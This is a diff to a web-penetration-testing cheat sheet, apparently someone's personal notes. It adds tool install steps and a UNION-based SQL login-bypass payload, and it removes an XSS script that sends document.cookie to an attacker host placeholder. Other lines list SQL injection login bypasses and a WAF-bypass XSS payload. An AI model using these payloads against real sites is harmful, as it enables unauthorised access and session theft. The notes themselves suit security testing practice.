@@ -34,6 +34,10 @@ https://cheatsheet.haax.fr/web-pentest/files-and-files-inclusions/xxe/
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 [SQL cheat sheet]
 
+sudo pip3 install -r requirements.txt 
+sudo python3 setup.py install
+[install knock]
+
 knockpy (url.com) --no-local -o (.txt) --no-http-code 500 404 306
 [quick subdomain enum]
 
@@ -174,7 +178,8 @@ s
 
 #SQL
 [+] 123456' and 1=1# -- Executing SQL command with login pass/ setting condition to TRUE	
-[+} passs' or 1=1# -- Conditioning database with TRUE SQL statement and wrong pass
+[+] test' UNION SELECT "pass" as password FROM admins WHERE '1'='1
+[+] passs' or 1=1# -- Conditioning database with TRUE SQL statement and wrong pass
 [+] admin' # ---- code execution for username side to exclude correct pass
 [+] inject SQL in url tab if there is no login form to discover if server takes SQL
 [+] "'; or 1=1#" --encode in URL
@@ -300,8 +305,6 @@ s
 
 #XSS
 [+] <Img Src=OnXSS OnError=confirm(1)> -- WAF Bypass payload 
-[+] <script>image = new Image();
-image.src='http://attacker_server_ip/?c='+document.cookie;</script>  -- steal cookies
 [+] Test site with html injection tags e.g <b>test<b> beforre inputting XSS
 [+] Scope: test COMMENTS, FEEDBACKS, CHECK STOCK & SEARCH 
 [+] Check the string or parameter you are entrapped by inspecting webpage
